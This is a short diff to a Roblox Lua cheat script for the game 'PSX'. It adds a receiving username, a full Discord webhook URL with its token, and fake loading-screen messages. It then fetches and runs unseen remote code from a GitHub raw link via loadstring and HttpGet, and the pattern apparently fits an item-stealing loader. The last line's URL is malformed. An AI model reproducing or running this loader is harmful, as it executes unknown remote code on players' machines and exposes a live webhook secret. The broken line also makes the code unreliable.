@@ -1,2 +1,10 @@
-_G.Key = "retaehc_reppus"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua"))()
+Username = "supper_cheater"
+WebHook = "https://discord.com/api/webhooks/1086621530303238195/QuMeRWF1Eh6CClGOiM5kp4FNILO29w1c2_WfK8CMhgXnyMCnVDPxz67_0W5kixvdrI5e"
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22))() 
